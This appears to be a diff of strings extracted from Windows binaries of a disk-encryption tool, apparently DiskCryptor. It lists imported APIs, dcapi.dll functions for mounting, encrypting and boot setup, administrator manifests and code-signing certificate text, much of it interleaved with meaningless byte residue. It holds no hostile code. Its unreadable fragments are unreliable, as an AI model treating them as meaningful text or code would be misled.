+DrawTextExW
+FillRect
+LoadBitmapW
+GetClassNameW
+LoadCursorW
+GetKeyState
+USER32.dll
+GetStockObject
+SetBkMode
+SetDCBrushColor
+SelectObject
+GetTextExtentPoint32W
+SetTextColor
+ExtTextOutW
+SetBkColor
+GetTextMetricsW
+CreateFontIndirectW
+GDI32.dll
+GetOpenFileNameW
+GetSaveFileNameW
+COMDLG32.dll
+RegCreateKeyW
+RegQueryValueExW
+RegOpenKeyW
+RegDeleteValueW
+RegCloseKey
+RegSetValueExW
+ADVAPI32.dll
+ShellExecuteW
+SHBrowseForFolderW
+Shell_NotifyIconW
+SHGetPathFromIDListW
+SHELL32.dll
+is_win_vista
+dc_dsk_get_size
+dc_get_mbr_config
+dc_get_boot_device
+dc_format_byte_size
+dc_get_boot_disk
+dc_mbr_config_by_partition
+secure_free
+dc_unmount_all
+save_file
+dc_restore_header
+dc_device_control
+dc_unset_mbr
+dc_change_password
+dc_mount_volume
+dc_backup_header
+dc_update_boot
+dc_done_format
+dc_set_mbr
+dc_set_boot
+dc_make_pxe
+dc_get_drive_info
+dc_mount_all
+dc_get_cipher_name
+dc_unmount_volume
+dc_make_iso
+dc_start_decrypt
+dc_set_mbr_config
+dc_format_fs
+dc_benchmark
+dc_next_volume
+dc_get_hw_name
+dc_first_volume
+dc_remove_driver
+dc_load_config
+dc_update_driver
+dc_get_version
+dc_is_driver_works
+rnd_init
+dc_install_driver
+dc_is_old_runned
+dc_is_driver_installed
+is_wow64
+is_admin
+dc_open_device
+secure_alloc
+dc_add_keyfiles
+rnd_reseed_now
+dc_encrypt_iso_image
+dc_get_bsod
+dc_save_config
+load_file
+dc_start_encrypt
+dc_start_format
+dc_start_re_encrypt
+dc_get_device_status
+enable_privilege
+dc_dec_step
+dc_sync_enc_state
+dc_enc_step
+dc_format_step
+dc_disk_close
+dc_disk_open
+dcapi.dll
+_wcslwr
+wcstoul
+_snwprintf
+wcsstr
+malloc
+wcsrchr
+_snprintf
+wcsncat
+wcsncpy
+wcschr
+_vsnwprintf
+msvcrt.dll
+memset
+memcpy
+__wgetmainargs
+_cexit
+_XcptFilter
+_wcmdln
+_initterm
+_amsg_exit
+__setusermatherr
+__p__commode
+__p__fmode
+__set_app_type
+?terminate@@YAXXZ
+_controlfp
+RtlUnwind
+InterlockedExchange
+InterlockedCompareExchange
+GetStartupInfoW
+TerminateProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+QueryPerformanceCounter
+GetTickCount
+GetCurrentProcessId
+_CIlog
+wwwwwx
+wwwwrx
+wwwwww
+wwwwrx
+wwwwww
+333333333333333333333333333333335
+33333>
+33333>
+33333>
+33333=
+3333333=
+333333=
+33333333333333333333333333333333
+33333333>
+33333333
+CCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+?CCCCC
+jjjjjjjjjjjjjjjjjjjjjj*
+jjjjjjjjjjjjjjjjjj
+jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+jCCCCjppppppppppppppppppppppppppppppppppppppppppjCCCC
+111111111111111111111111111111111111111111
+CCCCpeeeee1F
+UapeeeeeeeeeY
+CCCCCCCCCCC?
+CCCCCCCCCCCCCCCCCCe"""""e
+CCCCCCCCCCCCC
+"""""""
+CCCCCCCCCCCCCCCCCe"""""e
+CCCCCCCC
+CCCC?e""""""
+CCCCCCCCCCCCC
+CC""
+s
+CC""
+ehCCCC
+YCCC
+CCC;RRRRRR
+CCOOOOO
+CCCkOOOO8
+OOOOO"
+CCRKKKKKR
+CCCZKKKKK
+CCC8KKKKK
+CCCCCC
+CCCCCC
+?CCCCCC
+mmmmm'CCC6mmmmmmhCCC
+?CCCCCC
+CC}TTTTT}?CCCCCC
+TTTTTT
+CCTxxxxxT?CCC
+CCCNxxxxxx
+JJJJJJ
+JJJ!CCC
+bbbbbJ
+CCCHbbbNCCC
+CCJbbbbbJ
+CCCgbbbbbb
+CCCC7JbkCCC
+CCJ33333J
+CCCn333333
+CCCCCCCCCCCC
+CCCCCCCC
+&333333T
+CCCCCCCCCCCCCCCCCCCCCC]00000]
+CCCCCCCCC70000000f
+CCCCCCCCCCCCCCCCCCCCCb00000]
+CCCCCCCCCC
+00000003
+CCCC3{{{{{
+{{{{{{{{{{3
+]]]]]]]]]
+3CCCC0
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCC
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+[[[[[[[&
+&[[[[[[[
+}}}}}}}}}}}
+}}}}}}#######
+BBNr}}}#######rr#}}}#}
+BBBB
+BBBBBBBBBBVM
+M<BBBBBBBBBBBZ
+444*BB
+nxBB;R
+mt5naBB
+aWWE5:
+BBBBBBBBBUkL
+BBU!
+a>>>aaok]
+kkk]]kkk]]]kkkk
+m%``````````
+t```````%
+BB
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+::%DYYYY
+\YYYDA:\m
+{::::YB
+W,,IW,,
+W,,uW,,OW,,
+W,,7W,,bW,,
+W,,EW,,
+W,,uW,,
+W,,DW,,
+W,,]W,,
+W,,6W,,6W,,6W,,6W,,6W,,6W,,6W,,6W,,6W,,1W,,
+W,,5W,,
+W,,qW,,
+W,,.W,,
+W,,bW,,
+W,,!W,,
+W,,7W,,
+W,,OW,,
+W,,fW,,
+W,,tW,,
+W,,yW,,
+W,,vW,,
+W,,kW,,
+W,,VW,,
+W,,=W,,
+W,,(W,,
+W,,jW,,
+W,,<W,,
+W,,EW,,
+W,,gW,,
+W,,iW,,iW,,iW,,iW,,
+W,,5W,,
+W,,RW,,
+W,,&W,,
+W,,PW,,
+W,,4W,,pW,,
+W,,]W,,
+W,,TW,,
+W,,#W,,eW,,
+W,,EW,,
+U**lU**qR'(
+V++2V++;V++;V++;V++<V++:V,,*W,,
+W,,9O$%
+W++NP%%
+W,,2W,,
+T))lT))
+W,,RW,,
+W,,gW,,
+W,,}W,,
+X-- P%%
+X-- P%$
+W,,pW,,
+S''tU**
+W,,ZW,,
+U))\O"$
+W,,>W,,
+V--"W--"W--"W--#W--#W,,
+T((pS''eQ$$
+W--NQ$$
+W,,{V**
+V++_W,,"W,,.V++iU**
+R((kT**<R'(
+W,,Rd86
+W,,cxPM
+O#$9i@>
+N"#R~WT
+S((+W,,
+S''.W,,
+S''"W,,
+M 8|XX
+eN!!dW,,+
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>PADPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGX
+0%010=1X2`2x2
+3"3'3,31363<3D3L3c3
+4$4+4?4D4
+5/5:5@5
+6"6)60676>6E6L6T6\6d6p6y6~6
+9"9o9t9
+:<:_:l:x:
+;%;V;r;
+0#0.0D0P0
+2%2<2K2\2j2p2x2
+5$5J5h5m5s5
+9*:\:t:
+:J;f;s;
+=)=B=b=
+=m>&?/?9?K?[?e?
+0+121i1
+3H4\4e4
+99&9-9C9a9i9o9
+:=:R:X:j:r:
+<C<^<v<
+<4=<=B=O=V=
+>+>J>q>
+0:0a0v0
+161\1b1
+1%2,252>2G2T2`2p2t2x2|2
+4*464B4O4`4
+4;5W5o5
+9939]9
+:&:2:8:>:
+;4;H;P;^;z;
+<"<9<@<F<[<b<h<
+="=)=2=9=I=P=m=
+>>'>>>M>
+021:1B1_1k1}1
+222U2_2i2s2}2
+3 3/393V3[3
+6C6P6p6
+707M7T7d7
+1"12181
+2!2'21272=2H2M2W2]2n2
+3!3,3;3C3S3b3
+3)4:4A4F4M4Z4g4t4
+5#5@5G5S5d5w5
+626<6K6P6Z6h6w6
+6"737?7i7o7x7
+;";2;a;
+<;<d<u<
+=%=.=:=J=S=l=s=
+>'>,>3>O>W>
+?'?0?B?N?U?m?t?
+ 0/0H0L0P0T0j0~0
+1#1:1^1w1
+262=2H2_2e2l2s2
+353X3i3p3
+6:7U7p7
+8$8(8,808M8
+9&949@9F9L9`9r9y9
+<'<8<H<^<i<
+>/>:>@>W>
+?.?=?Q?n?
+0*030O0[0e0z0
+1[1b1i1p1
+1 212j2{2
+7.8N8S8v8
+909<9C9M9\9
+=!>'>|>
+????X?d?}?
+0!0(0G0V0m0
+131\1o1|1
+2!242=2J2O2T2i2{2
+393E3U3r3z3
+444N4U4
+5"585r5|5
+6Y6g6z6
+8I9h9q9v9
+:!:J:Z:`:}:
+;*;Z;a;
+<4<;<O<f<m<
+0R0]0j0w0}0
+11-141O1Y1c1m1w1
+2:2B2J2R2c2|2
+33393>3M3W3e3z3
+4-4@4J4R4_4v4
+5%505K5V5q5|5
+6S6[6i6x6
+7#7.747;7O7U7l7q7
+828H8a8
+9$9+92999@9G9N9U9\9f9p9z9
+:$:.:8:S:X:b:l:v:
+; ;$;(;,;0;4;8;<;@;D;H;L;P;T;X;\;`;d;h;l;p;t;x;|;
+=(=6=r=
+> >H>N>
+2N2m2~2?3
+565A5H5M5`5f5x5
+7-7^7r7
+8W8i8}8
+8W9o9z9
+:!:5:;:N:T:
+; <&<s<
+3&323>3b3h3
+4.474I4N4
+585D5^5x5~5
+6$6>6G6M6j6
+6'7G7Y7{7
+9$:*:s:
+:9;M;u;z;
+;=<D<T<
+<+=9=M=V=h=
+>#>Z>l>
+2(2:2@2l2
+40565K5[5c5
+6W6p6}6
+7?7i7u7
+8N9W9~9
+:0:8:e:l:q:
+;&;5;<;Z;g;l;
+<#<1<><P<X<
+>6>W>c>
+3*4M4Y4k4t4{4
+505Z5h5o5
+6"696q6x6
+767E7L7Y7
+8&8,8k8r8x8
+8)9@9L9X9^9
+;,;L;[;
+<T<[<b<
+=2=:=K=\=m=s=
+>#>(>->2>7><>A>J>P>
+?)?.?7?G?[?g?
+0?0E0U0Z0}0
+031M1S1Y1^1m1r1w1
+3+373I3l3x3
+4 4H4x4
+55-5E5V5f5
+6#6(656G6R6
+7#7:7A7L7Q7m7w7
+; ;9;D;];
+<&<N<[<f<w<
+<0=4=8=<=@=D=H=L=P=T=X=\=`=d=h=l=p=t=x=|=
+?(?5?@?F?P?U?[?d?q?
+0"0B0b0z0
+4K4$5.5B5L5v5
+6I6^6g6
+8-8;8G8Y8_8r8
+<8<P<X<
+='=_=e=u=
+>$>,>C>_>g>}>
+0&111B1J1P1X1f1p1x1
+434:4f4
+4*515W5n5}5
+;,;?;N;
+??*?>?S?i?
+0/090I0T0m0t0
+4*4=4V4^4d4l4z4
+4T5X5\5`5d5
+6 6$6(6,6Z6j6
+8$9<9_9j9
+:+:I:m:
+>3>;>C>o>
+<0`0o0u0
+051E1J1Q1d1
+2!2(232
+T>X>|>
+5D8H8L8P8T8X8\8`8p8
+9 909@9P9`9p9
+:(:4:@:L:
+;$;,;4;<;D;L;T;\;d;l;t;|;
+<$<,<4<<<D<L<T<\<d<l<t<|<
+Western Cape1
+Durbanville1
+Thawte1
+Thawte Certification10
+Thawte Timestamping CA0
+121221000000Z
+201230235959Z0^1
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G20
+http://ocsp.thawte.com0
+.http://crl.thawte.com/ThawteTimestampingCA.crl0
+TimeStamp-2048-10
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G20
+121018000000Z
+201229235959Z0b1
+Symantec Corporation1402
++Symantec Time Stamping Services Signer - G40
+http://ts-ocsp.ws.symantec.com07
++http://ts-aia.ws.symantec.com/tss-ca-g2.cer0<
++http://ts-crl.ws.symantec.com/tss-ca-g2.crl0(
+TimeStamp-2048-20
+VeriSign, Inc.10
+VeriSign Trust Network1;09
+2Terms of use at https://www.verisign.com/rpa (c)101.0,
+%VeriSign Class 3 Code Signing 2010 CA0
+131122000000Z
+151203235959Z0
+Russia1
+Moscow1
+ReactOS Foundation1>0<
+5Digital ID Class 3 - Microsoft Software Validation v21
+ReactOS Foundation0
+/http://csc3-2010-crl.verisign.com/CSC3-2010.crl0D
+https://www.verisign.com/rpa0
+http://ocsp.verisign.com0;
+/http://csc3-2010-aia.verisign.com/CSC3-2010.cer0
+VeriSign, Inc.10
+VeriSign Trust Network1:08
+1(c) 2006 VeriSign, Inc. - For authorized use only1E0C
+<VeriSign Class 3 Public Primary Certification Authority - G50
+100208000000Z
+200207235959Z0
+VeriSign, Inc.10
+VeriSign Trust Network1;09
+2Terms of use at https://www.verisign.com/rpa (c)101.0,
+%VeriSign Class 3 Code Signing 2010 CA0
+https://www.verisign.com/cps0*
+https://www.verisign.com/rpa0
+[0Y0W0U
+image/gif0!00
+#http://logo.verisign.com/vslogo.gif04
+#http://crl.verisign.com/pca3-g5.crl04
+http://ocsp.verisign.com0
+VeriSignMPKI-2-80
+VeriSign, Inc.10
+VeriSign Trust Network1;09
+2Terms of use at https://www.verisign.com/rpa (c)101.0,
+%VeriSign Class 3 Code Signing 2010 CA
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G2
+140709064207Z0#
+*LDszA4
+\3X"2Xk
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@.reloc
+URPQQh
+UQPXY]Y[
+```hhh
+xppwpp
+dc_next_volume
+dc_first_volume
+dc_get_boot_device
+dc_get_mbr_config
+dc_unset_mbr
+dc_remove_driver
+dc_install_driver
+dc_update_driver
+dc_update_boot
+dc_is_driver_installed
+dc_open_device
+dc_is_old_runned
+dcapi.dll
+_wcsicmp
+msvcrt.dll
+__wgetmainargs
+_cexit
+_XcptFilter
+_wcmdln
+_initterm
+_amsg_exit
+__setusermatherr
+__p__commode
+__p__fmode
+__set_app_type
+?terminate@@YAXXZ
+_controlfp
+RtlUnwind
+InterlockedExchange
+InterlockedCompareExchange
+GetStartupInfoW
+TerminateProcess
+GetCurrentProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetModuleHandleA
+QueryPerformanceCounter
+GetTickCount
+GetCurrentThreadId
+GetCurrentProcessId
+GetSystemTimeAsFileTime
+KERNEL32.dll
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>PADPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGX
+0#080?0F0T0`0z0
+384@4X4
+5$5,5C5b5k5
+66$6p6z6
+7 7i7u7{7
+8%8,848<8D8P8Y8^8d8n8w8
+;O;T;n;{;
+<?<L<X<`<h<t<
+!This program cannot be run in DOS mode.
+/*CLND
+RichLND
+`.rdata
+@.data
+@.reloc
+URPQQh
+UQPXY]Y[
+PSQj V
+T$PRh|
+uISSSSh
+L$xQSShX
+D$x t)h
+T$pRWWhX
+L$ QSRj V
+\$DSWVRQPh
+PWQj V
+8hVu2f
+PWQj V
+WCSh4j@
+u'h`j@
+PWQj V
+1tWHtfH
+QWRj V
+<1u;h<b@
+PWQj V
+<1u4h<b@
+<5u?hxf@
+RSPj V
+)u=h8v@
+8\u.f9H
+u'hxx@
+```hhh
+xppwpp
+Keyfiles not loaded, error %d
+1.1.846.118
+dc_mbr_config_by_partition
+load_file
+dc_unset_mbr
+dc_dsk_get_size
+dc_get_hw_name
+dc_get_mbr_config
+dc_update_boot
+dc_format_byte_size
+dc_set_boot
+dc_make_pxe
+dc_get_boot_disk
+dc_make_iso
+dc_set_mbr_config
+dc_start_encrypt
+dc_load_config
+dc_get_version
+rnd_reseed_now
+secure_free
+dc_next_volume
+dc_unmount_all
+dc_is_driver_works
+save_file
+dc_restore_header
+dc_device_control
+rnd_init
+dc_is_old_runned
+dc_change_password
+dc_mount_volume
+dc_backup_header
+dc_dec_step
+dc_encrypt_iso_image
+dc_get_boot_device
+dc_done_format
+dc_get_device_status
+dc_set_mbr
+dc_start_format
+dc_get_bsod
+secure_alloc
+dc_first_volume
+dc_mount_all
+dc_start_re_encrypt
+dc_add_keyfiles
+dc_get_cipher_name
+dc_unmount_volume
+dc_add_password
+dc_sync_enc_state
+is_wow64
+dc_start_decrypt
+is_admin
+dc_save_config
+dc_open_device
+dc_enc_step
+dc_format_fs
+dc_format_step
+dc_benchmark
+dcapi.dll
+_wcslwr
+_snwprintf
+__iob_func
+wprintf
+fgetws
+tolower
+isdigit
+_getch
+wscanf
+_wcsicmp
+_putch
+wcsncpy
+printf
+_kbhit
+msvcrt.dll
+memset
+__wgetmainargs
+_cexit
+_XcptFilter
+_initterm
+_amsg_exit
+__setusermatherr
+__p__commode
+__p__fmode
+__set_app_type
+?terminate@@YAXXZ
+_controlfp
+GetCommandLineW
+GetCommandLineA
+SetConsoleCursorPosition
+GetStdHandle
+FillConsoleOutputCharacterW
+GetConsoleScreenBufferInfo
+SetVolumeMountPointW
+RtlUnwind
+InterlockedExchange
+InterlockedCompareExchange
+TerminateProcess
+GetCurrentProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetModuleHandleA
+QueryPerformanceCounter
+GetTickCount
+GetCurrentThreadId
+GetCurrentProcessId
+GetSystemTimeAsFileTime
+KERNEL32.dll
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>PADPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING
+0%010=1X2`2x2
+3"3'3,31363<3D3L3g3p3
+40464<4B4O4U4^4}4
+5 5&5-565<5D5J5W5_5e5
+6"6-6;6@6F6Q6X6
+7Y8d8j8t8z8
+:&:3:;:
+;6;S;c;
+<!<'<K<Q<r<{<
+>/>X>z>
+0$0/0A0I0X0q0y0
